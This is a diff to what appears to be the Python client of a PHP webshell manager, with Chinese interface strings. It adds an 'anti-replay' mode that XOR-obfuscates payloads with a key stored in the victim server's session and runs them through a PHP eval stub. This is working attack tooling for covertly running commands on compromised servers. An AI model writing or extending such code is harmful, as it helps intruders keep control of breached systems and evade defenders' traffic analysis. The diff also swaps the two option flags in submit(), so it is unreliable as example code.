@@ -5,26 +5,19 @@ import base64
 import json
 import logging
 import random
-import re
 import string
+import functools
 import typing as t
-import dataclasses
 from binascii import Error as BinasciiError
-import httpx
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
 
 from . import exceptions
 
-from ..utils import random_english_words, random_user_agent, random_data
+from ..utils import random_english_words, random_user_agent
 from .base import (
     PHPSessionInterface,
     DirectoryEntry,
     BasicInfoEntry,
-    register_session,
     ConnOption,
-    ConnOptionGroup,
-    get_http_client,
 )
 
 logger = logging.getLogger("sessions.php")
@@ -330,6 +323,14 @@ php_webshell_conn_options = [
         default_value=False,
         alternatives=None,
     ),
+    ConnOption(
+        id="antireplay",
+        name="HTTP反重放",
+        type="checkbox",
+        placeholder=None,
+        default_value=False,
+        alternatives=None,
+    ),
 ]
 
 # TODO: fix string repr, php will parse `$` in quoted strings
@@ -346,6 +347,7 @@ class PHPWebshell(PHPSessionInterface):
         self.encoder = options.get("encoder", "raw")
         self.decoder = options.get("decoder", "raw")
         self.sessionize_payload = options.get("sessionize_payload", False)
+        self.antireplay = options.get("antireplay", False)
         # for upload file and download file
         self.chunk_size = 32 * 1024
         self.max_coro = 4
@@ -657,6 +659,55 @@ class PHPWebshell(PHPSessionInterface):
         except BinasciiError as exc:
             raise exceptions.UnknownError("base64解码接收到的数据失败") from exc
 
+    def sessionize_payload_wrapper(
+        self, submitter: t.Callable[[str], t.Awaitable[str]]
+    ) -> t.Callable[[str], t.Awaitable[str]]:
+        @functools.wraps(submitter)
+        async def wrap(payload: str) -> str:
+            payloads = to_sessionize_payload(payload)
+            result = None
+            for payload_part in payloads:
+                result = await submitter(payload_part)
+                if result == "PAYLOAD_SESSIONIZE_UNEXIST":
+                    raise exceptions.UnknownError(
+                        "Session中不存在payload，是不是不支持Session？"
+                    )
+            assert result is not None
+            return result
+
+        return wrap
+
+    def replay_stopper_wrapper(
+        self, submitter: t.Callable[[str], t.Awaitable[str]]
+    ) -> t.Callable[[str], t.Awaitable[str]]:
+        @functools.wraps(submitter)
+        async def wrap(payload: str) -> str:
+            key = await submitter("echo($_SESSION['replay_key']=rand()%256);")
+            try:
+                key = int(key)
+            except Exception as exc:
+                raise exceptions.UnknownError(
+                    "部署重放防护失败，无法从服务器获得对应的key"
+                ) from exc
+            payload_xor = base64_encode(
+                bytes(c ^ key for c in base64_encode(payload).encode())
+            )
+            code = """
+            $payload_xor = base64_decode(PAYLOAD_XOR);
+            $arr = [];
+            for($i = 0; $i < strlen($payload_xor); $i ++) {
+                $arr[$i] = chr(ord($payload_xor[$i]) ^ $_SESSION['replay_key']);
+            }
+            $code = implode("", $arr);
+            eval(base64_decode($code));
+            """.replace(
+                "PAYLOAD_XOR", repr(payload_xor)
+            ).replace("    ", "")
+            result = await submitter(code)
+            return result
+
+        return wrap
+
     async def _submit(self, payload: str) -> str:
         """将php payload通过encoder编码后提交"""
         start, stop = (
@@ -698,17 +749,12 @@ class PHPWebshell(PHPSessionInterface):
 
     async def submit(self, payload: str) -> str:
         # sessionize_payload
-        payloads = [payload]
+        submitter = self._submit
         if self.sessionize_payload:
-            payloads = to_sessionize_payload(payload)
-        result = None
-        for payload_part in payloads:
-            result = await self._submit(payload_part)
-            if result == "PAYLOAD_SESSIONIZE_UNEXIST":
-                raise exceptions.UnknownError(
-                    "Session中不存在payload，是不是不支持Session？"
-                )
-        return result
+            submitter = self.replay_stopper_wrapper(submitter)
+        if self.antireplay:
+            submitter = self.sessionize_payload_wrapper(submitter)
+        return await submitter(payload)
 
     async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
         """提交原始php payload
